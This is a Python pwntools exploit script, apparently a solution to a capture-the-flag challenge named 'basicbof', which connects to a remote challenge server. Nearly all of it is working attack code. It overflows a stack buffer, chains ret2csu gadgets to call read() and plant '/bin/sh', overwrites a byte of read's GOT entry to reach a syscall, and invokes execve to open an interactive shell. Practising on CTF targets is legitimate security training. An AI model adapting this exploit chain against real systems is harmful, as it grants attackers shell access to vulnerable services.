import time
from pwn import *
#target=process(['./ld-2.27.so','./basicbof'],env={"LD_PRELOAD":"./libc-2.27.so"})
target=remote('challenges.ctfd.io',30096)

payload="A"*0x88

main=0x401122
readgot=0x404018
readplt=0x401030
csu1=0x4011a2
csu2=0x401188
finiptr=0x402e48 
writeaddr=0x404f10

payload+=p64(csu1)
payload+=p64(0)#rbx=0
payload+=p64(1)#rbp=1
payload+=p64(0)#r12=edi=0(fd)
payload+=p64(writeaddr)#r13=rsi
payload+=p64(17)#r14=rdx
payload+=p64(finiptr)#r15=finiptr
payload+=p64(csu2)
payload+=p64(0)#bogus
payload+=p64(0)#bogus
payload+=p64(0)#bogus
payload+=p64(0)#bogus
payload+=p64(0)#bogus
payload+=p64(0)#bogus
payload+=p64(0)#bogus
payload+=p64(readplt)
payload+=p64(main)
target.sendline(payload)
time.sleep(1)
target.sendline("/bin/sh\x00"+p64(readplt))

payload="A"*0x88
payload+=p64(csu1+1)
payload+=p64(1)#rbp to match rbx
payload+=p64(0)#r12=edi
payload+=p64(readgot)#r13=rsi
payload+=p64(1)#r14=rdx
payload+=p64(finiptr)#r15 call
payload+=p64(csu2)
payload+=p64(0)#bogus
payload+=p64(0)#rbx
payload+=p64(1)#rbp
payload+=p64(1)#r12
payload+=p64(writeaddr)#r13
payload+=p64(59)#r14
payload+=p64(finiptr)#r15
payload+=p64(readplt)#read(0,readgot,1)
payload+=p64(csu2)
payload+=p64(0)#bogus
payload+=p64(0)#rbx
payload+=p64(1)#rbp
payload+=p64(writeaddr)#r12
payload+=p64(0)#r13
payload+=p64(0)#r14
payload+=p64(writeaddr+8)#r15
payload+=p64(readplt)#write(1,writeaddr,59)
payload+=p64(csu2)#execve(writeaddr,0,0)
time.sleep(1)
target.send(payload)
time.sleep(1)
target.send("\x7f")
target.interactive()
